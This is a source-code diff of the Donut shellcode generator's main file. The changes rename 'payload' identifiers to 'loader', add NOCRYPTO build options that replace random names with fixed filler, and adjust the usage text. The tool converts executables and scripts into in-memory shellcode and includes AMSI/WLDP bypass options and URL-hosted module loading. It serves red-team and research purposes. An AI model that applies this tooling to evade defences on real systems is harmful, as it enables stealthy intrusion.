@@ -31,8 +31,8 @@
 
 #include "donut.h"
 
-#include "payload/payload_exe_x86.h"
-#include "payload/payload_exe_x64.h"
+#include "loader/loader_exe_x86.h"
+#include "loader/loader_exe_x64.h"
   
 #define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
 #define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
@@ -514,6 +514,7 @@ static int is_dll_export(file_info *fi, const char *function) {
     return found;
 }
 
+#if !defined(NOCRYPTO)
 // returns 1 on success else <=0
 static int CreateRandom(void *buf, uint64_t len) {
     
@@ -570,6 +571,7 @@ static int GenRandomString(void *output, uint64_t len) {
     str[i] = 0;
     return 1;
 }
+#endif
 
 static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     PDONUT_MODULE mod = NULL;
@@ -600,10 +602,14 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     {
       // If no domain name specified, generate a random one
       if(c->domain[0] == 0) {
+        #if !defined(NOCRYPTO)
         if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
           err = DONUT_ERROR_RANDOM;
           goto cleanup;
         }
+        #else
+          memset(c->domain, 'A', DONUT_DOMAIN_LEN);
+        #endif
       }
       // Set the domain name to use
       DPRINT("Domain  : %s", c->domain);
@@ -634,8 +640,13 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     if(c->param[0] != 0) {
       // if type is unmanaged EXE, generate a random program name
       if(mod->type == DONUT_MODULE_EXE) {
+        #if !defined(NOCRYPTO)
         GenRandomString(mod->param, 4);
         mod->param[4] = ' ';
+        #else
+        memset(mod->param, 'A', 4);
+        mod->param[4] = ' ';
+        #endif
       }
       strncat(mod->param, c->param, DONUT_MAX_NAME-6);
     }
@@ -647,8 +658,9 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     // update configuration with pointer to module
     c->mod     = mod;
     c->mod_len = len;
-    
+#if !defined(NOCRYPTO)
 cleanup:
+#endif
     // if there was an error, free memory for module
     if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
       free(mod);
@@ -660,7 +672,9 @@ cleanup:
 }
 
 static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
+  #ifndef NOCRYPTO
     DONUT_CRYPT     inst_key, mod_key;
+  #endif
     PDONUT_INSTANCE inst;
     uint64_t        inst_len;
     uint64_t        dll_hash;
@@ -704,13 +718,13 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
       return DONUT_ERROR_RANDOM;
     }
-#endif
    
     DPRINT("Generating random IV for Maru hash");
     if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
       return DONUT_ERROR_RANDOM;
     }
-    
+#endif
+
     DPRINT("Generating hashes for API using IV: %" PRIx64, inst->iv);
     
     for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
@@ -803,6 +817,7 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     // if the module will be downloaded
     // set the URL parameter and request verb
     if(inst->type == DONUT_INSTANCE_URL) {
+      #if !defined(NOCRYPTO)
       // if no module name specified
       if(c->modname[0] == 0) {
         // generate a random name for module
@@ -812,6 +827,9 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
         }
         DPRINT("Generated random name for module : %s", c->modname);
       }
+      #else
+        memset(c->modname, 'A', DONUT_MAX_MODNAME);
+      #endif
       DPRINT("Setting URL parameters");
       strcpy(inst->http.url, c->url);
       // append module name
@@ -1040,14 +1058,14 @@ int DonutCreate(PDONUT_CONFIG c) {
     }
     // 4. calculate size of PIC + instance combined
     if(c->arch == DONUT_ARCH_X86) {
-      c->pic_len = sizeof(PAYLOAD_EXE_X86) + c->inst_len + 32;
+      c->pic_len = sizeof(LOADER_EXE_X86) + c->inst_len + 32;
     } else 
     if(c->arch == DONUT_ARCH_X64) {
-      c->pic_len = sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
+      c->pic_len = sizeof(LOADER_EXE_X64) + c->inst_len + 32;
     } else 
     if(c->arch == DONUT_ARCH_X84) {
-      c->pic_len = sizeof(PAYLOAD_EXE_X86) + 
-                   sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
+      c->pic_len = sizeof(LOADER_EXE_X86) + 
+                   sizeof(LOADER_EXE_X64) + c->inst_len + 32;
     }
     // 5. allocate memory for shellcode
     c->pic = malloc(c->pic_len);
@@ -1079,23 +1097,23 @@ int DonutCreate(PDONUT_CONFIG c) {
       PUT_BYTE(pl, 0x52);
       
       DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
-        (uint64_t)sizeof(PAYLOAD_EXE_X86));
+        (uint64_t)sizeof(LOADER_EXE_X86));
         
-      PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
+      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
     } else 
     // AMD64?
     if(c->arch == DONUT_ARCH_X64) {
       
       DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
-        (uint64_t)sizeof(PAYLOAD_EXE_X64));
+        (uint64_t)sizeof(LOADER_EXE_X64));
         
-      PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
+      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
     } else 
     // x86 + AMD64?
     if(c->arch == DONUT_ARCH_X84) {
       
       DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
-        (uint64_t)(sizeof(PAYLOAD_EXE_X86) + sizeof(PAYLOAD_EXE_X64)));
+        (uint64_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
         
       // xor eax, eax
       PUT_BYTE(pl, 0x31);
@@ -1105,15 +1123,15 @@ int DonutCreate(PDONUT_CONFIG c) {
       // js dword x86_code
       PUT_BYTE(pl, 0x0F);
       PUT_BYTE(pl, 0x88);
-      PUT_WORD(pl,  sizeof(PAYLOAD_EXE_X64));
-      PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
+      PUT_WORD(pl,  sizeof(LOADER_EXE_X64));
+      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
       // pop edx
       PUT_BYTE(pl, 0x5A);
       // push ecx
       PUT_BYTE(pl, 0x51);
       // push edx
       PUT_BYTE(pl, 0x52);
-      PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
+      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
     }
     
     // encode with base64?
@@ -1189,7 +1207,7 @@ int DonutDelete(PDONUT_CONFIG c) {
       free(c->inst);
       c->inst = NULL;
     }
-    // free payload
+    // free loader
     if(c->pic != NULL) {
       free(c->pic);
       c->pic = NULL;
@@ -1276,21 +1294,23 @@ static char* get_param (int argc, char *argv[], int *i) {
 
 static void usage (void) {
     printf(" usage: donut [options] -f <EXE/DLL/VBS/JS>\n\n");
-    
+    printf("       Only the finest artisanal donuts are made of shells.\n\n");   
     printf("                   -MODULE OPTIONS-\n\n");
     printf("       -f <path>            .NET assembly, EXE, DLL, VBS, JS file to execute in-memory.\n");
 #ifdef WINDOWS
     // TODO : printf("       -z                   Pack/Compress file using LZ algorithm.\n");
 #endif
     printf("       -n <name>            Module name. Randomly generated by default.\n");
-    //printf("       -w                   Command line is passed to unmanaged DLL function as ANSI. (default is UNICODE)\n");
+    printf("       -w                   Command line is passed to unmanaged DLL function as ANSI. (default is UNICODE)\n");
     printf("       -u <URL>             HTTP server that will host the donut module.\n\n");
 
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
     printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n");
     printf("       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)\n");
-    printf("       -o <payload>         Output file. Default is \"payload.bin\"\n");
+    
+    printf("       -o <payload>         Output file. Default is \"loader.bin\"\n");
     printf("       -e                   output in the specified format. (Will be copied to clipboard on Windows 0=raw, 1=base64, 2=c, 3=ruby, 4=python, 5=powershell, 6=C#, 7=hex)\n");
+
     printf("       -t                   Run entrypoint for unmanaged EXE as a new thread. (replaces ExitProcess with ExitThread in IAT)\n");
     printf("       -x                   Call RtlExitUserProcess to terminate the host process. (RtlExitUserThread is called by default)\n\n");
     
@@ -1314,7 +1334,7 @@ int main(int argc, char *argv[]) {
     char         opt;
     int          i, err;
     FILE         *fd;
-    char         *mod_type, *payload="payload.bin", 
+    char         *mod_type, *loader="loader.bin", 
                  *arch_str[3] = { "x86", "AMD64", "x86+AMD64" };
     char         *inst_type[2]= { "PIC", "URL"   };
     
@@ -1381,9 +1401,9 @@ int main(int argc, char *argv[]) {
         case 'n':
           strncpy(c.modname, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
-        // output file for payload
+        // output file for loader
         case 'o':
-          payload = get_param(argc, argv, &i);
+          loader = get_param(argc, argv, &i);
           break;
         // parameters to method, DLL function or command line for unmanaged EXE
         case 'p':
@@ -1431,7 +1451,7 @@ int main(int argc, char *argv[]) {
       usage();
     }
     
-    // generate payload from configuration
+    // generate loader from configuration
     err = DonutCreate(&c);
 
     if(err != DONUT_ERROR_SUCCESS) {
@@ -1490,12 +1510,12 @@ int main(int argc, char *argv[]) {
       c.bypass == DONUT_BYPASS_SKIP  ? "skip" : 
       c.bypass == DONUT_BYPASS_ABORT ? "abort" : "continue"); 
     
-    printf("  [ Shellcode     : \"%s\"\n", payload);
- 
-    fd = fopen(payload, "wb");
+    printf("  [ Shellcode     : \"%s\"\n", loader);
+
+    fd = fopen(loader, "wb");
 
     if(fd == NULL){
-      printf("  [ Error opening \"%s\" for payload.\n", payload);
+      printf("  [ Error opening \"%s\" for loader.\n", loader);
       return 0;
     }
     switch (c.encode){
